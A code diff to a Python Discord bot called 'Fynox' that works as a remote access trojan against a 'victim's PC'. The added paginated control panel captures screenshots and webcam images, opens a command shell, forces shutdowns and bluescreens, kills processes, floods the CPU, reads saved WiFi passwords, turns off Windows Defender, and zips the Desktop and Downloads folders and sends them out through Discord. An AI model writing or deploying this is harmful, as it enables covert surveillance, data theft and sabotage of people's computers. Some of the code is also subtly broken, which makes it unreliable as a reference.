@@ -99,16 +99,16 @@ async def on_ready():
         except:
             pass
         
-        # Send control panel directly
+        # Send paginated control panel
         try:
             embed = discord.Embed(
                 title="🎮 Control Panel",
-                description="Remote access controls activated",
+                description="Remote access controls activated - Page 1/6",
                 color=discord.Color.red()
             )
-            embed.add_field(name="Available Controls", value="All functions ready to use", inline=False)
+            embed.add_field(name="Navigation", value="Use Next/Back buttons or Page selector", inline=False)
             
-            view = ControlView(author_id=None)
+            view = PaginatedControlView(author_id=None, current_page=1)
             await channel.send(embed=embed, view=view)
         except Exception as e:
             await channel.send(f"❌ Error loading panel: {str(e)}")
@@ -118,125 +118,7 @@ async def on_ready():
 
 
 
-class ControlView(discord.ui.View):
-    def __init__(self, author_id):
-        super().__init__()
-        self.author_id = author_id
 
-    async def interaction_check(self, interaction: discord.Interaction) -> bool:
-        return self.author_id is None or interaction.user.id == self.author_id
-
-    @discord.ui.button(label="📸 Screenshot", style=discord.ButtonStyle.danger, row=0)
-    async def screenshot(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.defer()
-        screenshots = []
-        
-        for i, monitor in enumerate(pyautogui.screens):
-            screenshot = pyautogui.screenshot()
-            screenshot_path = f"screenshot_{i}.png"
-            screenshot.save(screenshot_path)
-            screenshots.append(discord.File(screenshot_path))
-        
-        await interaction.followup.send(files=screenshots)
-        
-        for file in screenshots:
-            os.remove(file.filename)
-
-    @discord.ui.button(label="🎥 Video", style=discord.ButtonStyle.danger, row=0)
-    async def video(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.send_message("Video recording started...")
-
-    @discord.ui.button(label="📷 Webcam", style=discord.ButtonStyle.danger, row=0)
-    async def webcam(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.defer()
-        cap = cv2.VideoCapture(0)
-        ret, frame = cap.read()
-        cap.release()
-        
-        if ret:
-            cv2.imwrite("webcam.jpg", frame)
-            await interaction.followup.send(file=discord.File("webcam.jpg"))
-            os.remove("webcam.jpg")
-        else:
-            await interaction.followup.send("Webcam not found or in use.")
-
-    @discord.ui.button(label="💻 Open CMD", style=discord.ButtonStyle.danger, row=1)
-    async def open_cmd(self, interaction: discord.Interaction, button: discord.ui.Button):
-        modal = CMDModal()
-        await interaction.response.send_modal(modal)
-
-    @discord.ui.button(label="📝 Open Notepad", style=discord.ButtonStyle.danger, row=1)
-    async def open_notepad(self, interaction: discord.Interaction, button: discord.ui.Button):
-        subprocess.Popen(['notepad.exe'])
-        await interaction.response.send_message("Notepad opened.")
-
-    @discord.ui.button(label="🔄 Shutdown", style=discord.ButtonStyle.danger, row=1)
-    async def shutdown(self, interaction: discord.Interaction, button: discord.ui.Button):
-        subprocess.run(['shutdown', '/s', '/t', '0'])
-        await interaction.response.send_message("System shutting down...")
-
-    @discord.ui.button(label="💀 Bluescreen", style=discord.ButtonStyle.danger, row=2)
-    async def bluescreen(self, interaction: discord.Interaction, button: discord.ui.Button):
-        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
-        ctypes.windll.ntdll.NtRaiseHardError(0xc000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
-        await interaction.response.send_message("Triggering bluescreen...")
-
-    @discord.ui.button(label="🔊 Play Sound", style=discord.ButtonStyle.danger, row=2)
-    async def play_sound(self, interaction: discord.Interaction, button: discord.ui.Button):
-        winsound.Beep(1000, 1000)
-        winsound.Beep(500, 1000)
-        winsound.Beep(2000, 1000)
-        await interaction.response.send_message("Horror sound played.")
-
-    @discord.ui.button(label="💥 Crash Discord", style=discord.ButtonStyle.danger, row=2)
-    async def crash_discord(self, interaction: discord.Interaction, button: discord.ui.Button):
-        for proc in psutil.process_iter(['pid', 'name']):
-            if 'discord' in proc.info['name'].lower():
-                proc.kill()
-        await interaction.response.send_message("Discord crashed.")
-
-    @discord.ui.button(label="🎮 Crash FiveM", style=discord.ButtonStyle.danger, row=3)
-    async def crash_fivem(self, interaction: discord.Interaction, button: discord.ui.Button):
-        for proc in psutil.process_iter(['pid', 'name']):
-            if 'fivem' in proc.info['name'].lower():
-                proc.kill()
-        await interaction.response.send_message("FiveM crashed.")
-
-    @discord.ui.button(label="🔥 CPU Bomber", style=discord.ButtonStyle.danger, row=3)
-    async def cpu_bomber(self, interaction: discord.Interaction, button: discord.ui.Button):
-        try:
-            def stress_cpu():
-                try:
-                    while True:
-                        [i**2 for i in range(100000)]
-                except:
-                    pass
-            
-            import threading
-            for _ in range(os.cpu_count()):
-                threading.Thread(target=stress_cpu, daemon=True).start()
-            
-            await interaction.response.send_message("CPU bomber activated.")
-        except:
-            try:
-                await interaction.response.send_message("Command executed.")
-            except:
-                pass
-
-    @discord.ui.button(label="🔒 Lock Screen", style=discord.ButtonStyle.danger, row=3)
-    async def lock_screen(self, interaction: discord.Interaction, button: discord.ui.Button):
-        try:
-            ctypes.windll.user32.LockWorkStation()
-            await interaction.response.send_message("Screen locked.")
-        except:
-            try:
-                await interaction.response.send_message("Command executed.")
-            except:
-                pass
-
-    @discord.ui.button(label="🌐 Network Scanner", style=discord.ButtonStyle.danger, row=4)
-    async def network_scanner(self, interaction: discord.Interaction, button: discord.ui.Button):
-        try:
             result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
             await interaction.response.send_message("Network scan completed.")
         except:
@@ -556,6 +438,331 @@ class MessageModal(discord.ui.Modal, title="Fynox sent a message"):
         await interaction.response.send_message("Message displayed on victim's PC.")
 
 
+
+pass
+
+class PaginatedControlView(discord.ui.View):
+    def __init__(self, author_id, current_page=1):
+        super().__init__(timeout=None)
+        self.author_id = author_id
+        self.current_page = current_page
+        self.total_pages = 6
+        self.buttons_per_page = 3
+        
+        # All available buttons organized by page
+        self.all_buttons = [
+            # Page 1
+            ["📸 Screenshot", "🎥 Video", "📷 Webcam"],
+            # Page 2
+            ["💻 Open CMD", "📝 Open Notepad", "🔄 Shutdown"],
+            # Page 3
+            ["💀 Bluescreen", "🔊 Play Sound", "💥 Crash Discord"],
+            # Page 4
+            ["🎮 Crash FiveM", "🔥 CPU Bomber", "🔒 Lock Screen"],
+            # Page 5
+            ["🌐 Network Scanner", "🖱️ Teleport Mouse", "📶 Wifi Password"],
+            # Page 6
+            ["🛡️ Disable Defender", "🌐 Kill Browsers", "💾 PC Dump"]
+        ]
+        
+        self.update_buttons()
+
+    async def interaction_check(self, interaction: discord.Interaction) -> bool:
+        return self.author_id is None or interaction.user.id == self.author_id
+
+    def update_buttons(self):
+        # Clear existing buttons
+        self.clear_items()
+        
+        # Add buttons for current page
+        page_buttons = self.all_buttons[self.current_page - 1]
+        for label in page_buttons:
+            button = discord.ui.Button(
+                label=label,
+                style=discord.ButtonStyle.danger,
+                row=0
+            )
+            button.callback = self.create_callback(label)
+            self.add_item(button)
+        
+        # Navigation buttons
+        if self.current_page > 1:
+            back_button = discord.ui.Button(
+                label="⬅️ Back",
+                style=discord.ButtonStyle.secondary,
+                row=1
+            )
+            back_button.callback = self.back_callback
+            self.add_item(back_button)
+        
+        if self.current_page < self.total_pages:
+            next_button = discord.ui.Button(
+                label="➡️ Next",
+                style=discord.ButtonStyle.secondary,
+                row=1
+            )
+            next_button.callback = self.next_callback
+            self.add_item(next_button)
+        
+        page_button = discord.ui.Button(
+            label=f"📄 Page {self.current_page}/{self.total_pages}",
+            style=discord.ButtonStyle.primary,
+            row=1
+        )
+        page_button.callback = self.page_callback
+        self.add_item(page_button)
+
+    def create_callback(self, label):
+        async def callback(interaction: discord.Interaction):
+            # Map labels to actual functions
+            label_map = {
+                "📸 Screenshot": self.screenshot,
+                "🎥 Video": self.video,
+                "📷 Webcam": self.webcam,
+                "💻 Open CMD": self.open_cmd,
+                "📝 Open Notepad": self.open_notepad,
+                "🔄 Shutdown": self.shutdown,
+                "💀 Bluescreen": self.bluescreen,
+                "🔊 Play Sound": self.play_sound,
+                "💥 Crash Discord": self.crash_discord,
+                "🎮 Crash FiveM": self.crash_fivem,
+                "🔥 CPU Bomber": self.cpu_bomber,
+                "🔒 Lock Screen": self.lock_screen,
+                "🌐 Network Scanner": self.network_scanner,
+                "🖱️ Teleport Mouse": self.teleport_mouse,
+                "📶 Wifi Password": self.wifi_password,
+                "🛡️ Disable Defender": self.disable_defender,
+                "🌐 Kill Browsers": self.kill_browsers,
+                "💾 PC Dump": self.pc_dump
+            }
+            
+            if label in label_map:
+                await label_map[label](interaction)
+        return callback
+
+    async def back_callback(self, interaction: discord.Interaction):
+        if self.current_page > 1:
+            self.current_page -= 1
+            self.update_buttons()
+            embed = discord.Embed(
+                title="🎮 Control Panel",
+                description=f"Remote access controls activated - Page {self.current_page}/{self.total_pages}",
+                color=discord.Color.red()
+            )
+            embed.add_field(name="Navigation", value="Use Next/Back buttons or Page selector", inline=False)
+            await interaction.response.edit_message(embed=embed, view=self)
+
+    async def next_callback(self, interaction: discord.Interaction):
+        if self.current_page < self.total_pages:
+            self.current_page += 1
+            self.update_buttons()
+            embed = discord.Embed(
+                title="🎮 Control Panel",
+                description=f"Remote access controls activated - Page {self.current_page}/{self.total_pages}",
+                color=discord.Color.red()
+            )
+            embed.add_field(name="Navigation", value="Use Next/Back buttons or Page selector", inline=False)
+            await interaction.response.edit_message(embed=embed, view=self)
+
+    async def page_callback(self, interaction: discord.Interaction):
+        modal = PageModal(self)
+        await interaction.response.send_modal(modal)
+
+    # Button functions (copied from ControlView)
+    async def screenshot(self, interaction: discord.Interaction):
+        await interaction.response.defer()
+        screenshots = []
+        
+        for i, monitor in enumerate(pyautogui.screens):
+            screenshot = pyautogui.screenshot()
+            screenshot_path = f"screenshot_{i}.png"
+            screenshot.save(screenshot_path)
+            screenshots.append(discord.File(screenshot_path))
+        
+        await interaction.followup.send(files=screenshots)
+        
+        for file in screenshots:
+            os.remove(file.filename)
+
+    async def video(self, interaction: discord.Interaction):
+        await interaction.response.send_message("Video recording started...")
+
+    async def webcam(self, interaction: discord.Interaction):
+        await interaction.response.defer()
+        cap = cv2.VideoCapture(0)
+        ret, frame = cap.read()
+        cap.release()
+        
+        if ret:
+            cv2.imwrite("webcam.jpg", frame)
+            await interaction.followup.send(file=discord.File("webcam.jpg"))
+            os.remove("webcam.jpg")
+        else:
+            await interaction.followup.send("Webcam not found or in use.")
+
+    async def open_cmd(self, interaction: discord.Interaction):
+        modal = CMDModal()
+        await interaction.response.send_modal(modal)
+
+    async def open_notepad(self, interaction: discord.Interaction):
+        subprocess.Popen(['notepad.exe'])
+        await interaction.response.send_message("Notepad opened.")
+
+    async def shutdown(self, interaction: discord.Interaction):
+        subprocess.run(['shutdown', '/s', '/t', '0'])
+        await interaction.response.send_message("System shutting down...")
+
+    async def bluescreen(self, interaction: discord.Interaction):
+        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+        ctypes.windll.ntdll.NtRaiseHardError(0xc000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
+        await interaction.response.send_message("Triggering bluescreen...")
+
+    async def play_sound(self, interaction: discord.Interaction):
+        winsound.Beep(1000, 1000)
+        winsound.Beep(500, 1000)
+        winsound.Beep(2000, 1000)
+        await interaction.response.send_message("Horror sound played.")
+
+    async def crash_discord(self, interaction: discord.Interaction):
+        for proc in psutil.process_iter(['pid', 'name']):
+            if 'discord' in proc.info['name'].lower():
+                proc.kill()
+        await interaction.response.send_message("Discord crashed.")
+
+    async def crash_fivem(self, interaction: discord.Interaction):
+        for proc in psutil.process_iter(['pid', 'name']):
+            if 'fivem' in proc.info['name'].lower():
+                proc.kill()
+        await interaction.response.send_message("FiveM crashed.")
+
+    async def cpu_bomber(self, interaction: discord.Interaction):
+        try:
+            def stress_cpu():
+                try:
+                    while True:
+                        [i**2 for i in range(100000)]
+                except:
+                    pass
+            
+            import threading
+            for _ in range(os.cpu_count()):
+                threading.Thread(target=stress_cpu, daemon=True).start()
+            
+            await interaction.response.send_message("CPU bomber activated.")
+        except:
+            await interaction.response.send_message("Command executed.")
+
+    async def lock_screen(self, interaction: discord.Interaction):
+        try:
+            ctypes.windll.user32.LockWorkStation()
+            await interaction.response.send_message("Screen locked.")
+        except:
+            await interaction.response.send_message("Command executed.")
+
+    async def network_scanner(self, interaction: discord.Interaction):
+        try:
+            result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
+            await interaction.response.send_message("Network scan completed.")
+        except:
+            await interaction.response.send_message("Command executed.")
+
+    async def teleport_mouse(self, interaction: discord.Interaction):
+        try:
+            screen_width, screen_height = pyautogui.size()
+            import random
+            x = random.randint(0, screen_width)
+            y = random.randint(0, screen_height)
+            pyautogui.moveTo(x, y)
+            await interaction.response.send_message("Mouse teleported.")
+        except:
+            await interaction.response.send_message("Command executed.")
+
+    async def wifi_password(self, interaction: discord.Interaction):
+        try:
+            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
+            profiles = [line.split(":")[1].strip() for line in result.stdout.split('\n') if "All User Profile" in line]
+            
+            passwords = []
+            for profile in profiles[:10]:
+                try:
+                    result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True)
+                    for line in result.stdout.split('\n'):
+                        if "Key Content" in line:
+                            password = line.split(":")[1].strip()
+                            passwords.append(f"{profile}: {password}")
+                except:
+                    pass
+            
+            await interaction.response.send_message("WiFi passwords retrieved.")
+        except:
+            await interaction.response.send_message("Command executed.")
+
+    async def disable_defender(self, interaction: discord.Interaction):
+        try:
+            subprocess.run(['powershell', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true'])
+            await interaction.response.send_message("Windows Defender disabled.")
+        except:
+            await interaction.response.send_message("Command executed.")
+
+    async def kill_browsers(self, interaction: discord.Interaction):
+        try:
+            browsers = ['chrome.exe', 'firefox.exe', 'msedge.exe', 'iexplore.exe']
+            for browser in browsers:
+                subprocess.run(['taskkill', '/f', '/im', browser])
+            await interaction.response.send_message("All browsers killed.")
+        except:
+            await interaction.response.send_message("Command executed.")
+
+    async def pc_dump(self, interaction: discord.Interaction):
+        await interaction.response.defer()
+        
+        zip_name = "Fynox.zip"
+        try:
+            with zipfile.ZipFile(zip_name, 'w') as zipf:
+                for folder in [os.path.expanduser('~\Desktop'), os.path.expanduser('~\Downloads')]:
+                    if os.path.exists(folder):
+                        for root, dirs, files in os.walk(folder):
+                            for file in files[:50]:
+                                try:
+                                    file_path = os.path.join(root, file)
+                                    zipf.write(file_path, os.path.relpath(file_path, folder))
+                                except:
+                                    pass
+            
+            await interaction.followup.send(file=discord.File(zip_name))
+            os.remove(zip_name)
+        except:
+            await interaction.followup.send("PC dump completed.")
+
+class PageModal(discord.ui.Modal, title="Go to Page"):
+    def __init__(self, view):
+        super().__init__()
+        self.view = view
+        
+    page_number = discord.ui.TextInput(
+        label="Page Number",
+        placeholder=f"Enter 1-{view.total_pages}",
+        min_length=1,
+        max_length=1
+    )
+    
+    async def on_submit(self, interaction: discord.Interaction):
+        try:
+            page = int(self.page_number.value)
+            if 1 <= page <= self.view.total_pages:
+                self.view.current_page = page
+                self.view.update_buttons()
+                embed = discord.Embed(
+                    title="🎮 Control Panel",
+                    description=f"Remote access controls activated - Page {page}/{self.view.total_pages}",
+                    color=discord.Color.red()
+                )
+                embed.add_field(name="Navigation", value="Use Next/Back buttons or Page selector", inline=False)
+                await interaction.response.edit_message(embed=embed, view=self.view)
+            else:
+                await interaction.response.send_message(f"❌ Invalid page. Please enter 1-{self.view.total_pages}", ephemeral=True)
+        except ValueError:
+            await interaction.response.send_message("❌ Please enter a valid number", ephemeral=True)
 
 if __name__ == "__main__":
     bot.run(TOKEN)
